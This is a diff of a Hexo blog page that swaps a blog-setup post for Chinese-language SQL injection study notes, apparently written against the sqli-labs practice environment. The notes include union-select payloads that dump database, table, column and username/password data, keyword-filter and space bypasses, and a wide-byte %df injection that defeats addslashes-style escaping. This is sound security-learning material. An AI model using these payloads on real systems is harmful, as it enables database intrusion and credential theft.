@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>第一篇博客 |  小张之栈</title>
+      <title>sql注入-tips |  小张之栈</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -64,7 +64,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-第一篇博客"
+  id="post-sql注入-tips"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -75,7 +75,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  第一篇博客
+  sql注入-tips
 </h1>
  
 
@@ -83,11 +83,11 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2023/05/12/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" class="article-date">
-  <time datetime="2023-05-12T14:22:22.000Z" itemprop="datePublished">2023-05-12</time>
+      <a href="/2023/05/20/sql%E6%B3%A8%E5%85%A5-tips/" class="article-date">
+  <time datetime="2023-05-20T02:11:37.000Z" itemprop="datePublished">2023-05-20</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/">博客搭建及其优化</a>
+    <a class="article-category-link" href="/categories/web%E6%BC%8F%E6%B4%9E/">web漏洞</a> / <a class="article-category-link" href="/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/">sql注入</a>
   </div>
   
 <div class="word_count">
@@ -95,7 +95,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">79</span>
+            <span class="post-count">790</span>
         </span>
     </span>
 
@@ -104,25 +104,71 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">1 分钟</span>
+            <span class="post-count">3 分钟</span>
         </span>
     </span>
 </div>
  
     </div>
       
+    <div class="tocbot"></div>
+
 
 
 
   
     <div class="article-entry" itemprop="articleBody">
        
-  <p>参照了杰克小麻雀所分享的经验而搭建的。</p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yushuaigee/article/details/111465155">(112条消息) 从零开始免费搭建自己的博客(一)——本地搭建hexo框架_在k什么框架搭建博客_杰克小麻雀的博客-CSDN博客</a></p>
+  <h2 id="爆破语句"><a href="#爆破语句" class="headerlink" title="爆破语句"></a>爆破语句</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 and &#x27;1&#x27;=&#x27;1 库</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1 表</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1 列</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(&#x27;~&#x27;,username,password) from security.users ),3 and &#x27;1&#x27;=&#x27;1 字段</span><br></pre></td></tr></table></figure>
+
+<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p><strong>其实注释本来的作用也就是闭合语句</strong></p>
+<p><strong>;%00</strong>代替–+进行注释</p>
+<p>闭合就是针对输入的，一般会对输入的参数再加上一对单引号</p>
+<h2 id="括号判断"><a href="#括号判断" class="headerlink" title="括号判断"></a>括号判断</h2><p>小括号判断：2’ and ‘1’&#x3D;’1 如果有括号，回显为id&#x3D;1页面</p>
+<p>没括号则是id&#x3D;2页面</p>
+<p><img src="/../../../Typora/img111/image-20230523131633798.png" alt="image-20230523131633798"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523131638108.png" alt="image-20230523131638108"></p>
+<h2 id="union-select-绕过"><a href="#union-select-绕过" class="headerlink" title="union select 绕过"></a>union select 绕过</h2><blockquote>
+<p>union select绕过 ：&#x2F;<strong>&#x2F;UNION&#x2F;</strong>&#x2F;SELECT&#x2F;**&#x2F;</p>
 </blockquote>
-<p>主题优化参照如下：</p>
-<p><a target="_blank" rel="noopener" href="https://shen-yu.gitee.io/2019/ayer/#%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE">Ayer中文说明 | 岛 (gitee.io)</a></p>
+<blockquote>
+<p>%75%6e%6f%69%6e %73%65%6c%65%63%74</p>
+</blockquote>
+<p>[SQL注入绕过关键词过滤的小技巧及原理（union select为例）_sql注入关键字过滤绕过_桑榆__的博客-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_54848371/article/details/120423529?ops_request_misc=%7B%22request_id%22:%22167955372116800192238946%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167955372116800192238946&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-120423529-null-null.142%5Ev76%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=union">https://blog.csdn.net/weixin_54848371/article/details/120423529?ops_request_misc=%7B%22request%5Fid%22%3A%22167955372116800192238946%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=167955372116800192238946&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-120423529-null-null.142^v76^insert_down38,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=union</a> select绕过&amp;spm&#x3D;1018.2226.3001.4187)</p>
+<h3 id="空格、注释绕过"><a href="#空格、注释绕过" class="headerlink" title="空格、注释绕过"></a>空格、注释绕过</h3><p>空格绕过：%0B代替空格，括号绕过</p>
+<p>注释绕过：用<strong>单引号闭合</strong>替代注释或者使用**;%00替代**。</p>
+<p>例如:?id&#x3D;1’ union select 1,2,3 and ‘1’&#x3D;’1</p>
+<h3 id="引号被注释"><a href="#引号被注释" class="headerlink" title="引号被注释"></a>引号被注释</h3><p><strong>闭合的用%df来（宽字节），字符串值处用16进制来</strong></p>
+<p><strong>mysql_real_escape_string() 函数</strong></p>
+<p>用来<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E8%BD%AC%E4%B9%89&spm=1001.2101.3001.7020">转义</a> SQL 语句中使用的字符串中的特殊字符。如果成功，则该函数返回被转义的字符串(即在字符前加”&quot;)。如果失败，则返回 false。</p>
+<h2 id="宽字节注入-df"><a href="#宽字节注入-df" class="headerlink" title="宽字节注入%df"></a>宽字节注入%df</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_63303407/article/details/127204281?ops_request_misc=%7B%22request_id%22:%22167955936416782427413061%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167955936416782427413061&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-127204281-null-null.142%5Ev76%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=%E5%AE%BD%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87&spm=1018.2226.3001.4187">slilabs靶场记录宽字节绕过(七)_mysql_real_escape_string 绕过_wanan0red的博客-CSDN博客</a></p>
+<ul>
+<li>宽字节注入的本质是PHP与MySQL使用的字符集不同，只要低位的范围中含有0x5c的编码，就可以进行宽字节注入。</li>
+<li>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</li>
+</ul>
+<p>预定义字符是：</p>
+<ul>
+<li>单引号（’）</li>
+<li>双引号（”）</li>
+<li>反斜杠（\）</li>
+<li>NULL</li>
+</ul>
+<blockquote>
+<p><code>uname=%df&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=</code><strong>0x7365637572697479</strong>) #&amp;passwd&#x3D;1&amp;submit&#x3D;Submit (字符串附近的引号用%df不行，所以将值转化为十六进制，0x…)</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132005607.png" alt="image-20230523132005607"></p>
+<h3 id="宽字节注入的防御："><a href="#宽字节注入的防御：" class="headerlink" title="宽字节注入的防御："></a>宽字节注入的防御：</h3><p><img src="/../../../Typora/img111/image-20230523132040435.png" alt="image-20230523132040435"></p>
+<h3 id="limit-0-1"><a href="#limit-0-1" class="headerlink" title="limit 0,1"></a>limit 0,1</h3><p>[MySQL 分页查询limit性能缺陷和优化方案_limit性能问题_西瓜游侠的博客-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/hbtj_1216/article/details/117190087?ops_request_misc=&request_id=&biz_id=102&utm_term=mysql">https://blog.csdn.net/hbtj_1216/article/details/117190087?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=mysql</a> limit漏洞&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduweb~default-2-117190087.142^v80^insert_down38,201^v4^add_ask,239^v2^insert_chatgpt&amp;spm&#x3D;1018.2226.3001.4187)</p>
+<p><code>limit m,n</code></p>
+<p>其中，m是偏移量，n是要查询的数量。</p>
+<blockquote>
+<p>当偏移量m过大的时候，查询效率会很低。因为MySQL是先查出m+n个数据，然后抛弃掉前m个数据。</p>
+</blockquote>
+<p><strong>limit 0,1从第一行开始，返回一行</strong></p>
+<p><strong>limit 1,1从第二行开始，返回一行</strong></p>
+<p><strong>limit 2,1从第三行开始，返回一行</strong></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132214461.png" alt="image-20230523132214461"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132219086.png" alt="image-20230523132219086"></p>
  
       <!-- reward -->
       
@@ -187,12 +233,12 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/05/12/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/05/20/sql%E6%B3%A8%E5%85%A5-tips/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8D%9A%E5%AE%A2%E7%BB%8F%E9%AA%8C%E6%9D%A5%E6%BA%90/" rel="tag">博客经验来源</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Mysql%E7%88%86%E7%A0%B4%E8%AF%AD%E5%8F%A5/" rel="tag">Mysql爆破语句</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/" rel="tag">sql注入技巧</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/" rel="tag">注入绕过</a></li></ul>
 
     </footer>
   </div>
@@ -200,15 +246,20 @@
    
   <nav class="article-nav">
     
-      <a href="/2023/05/13/%E7%9F%A5%E8%AF%86%E5%9F%BA%E7%A1%80/" class="article-nav-link">
+      <a href="/2023/05/20/sqli-labs/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            知识基础
+            sqli
           
         </div>
       </a>
     
+    
+      <a href="/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">sql注入</div>
+      </a>
     
   </nav>
 
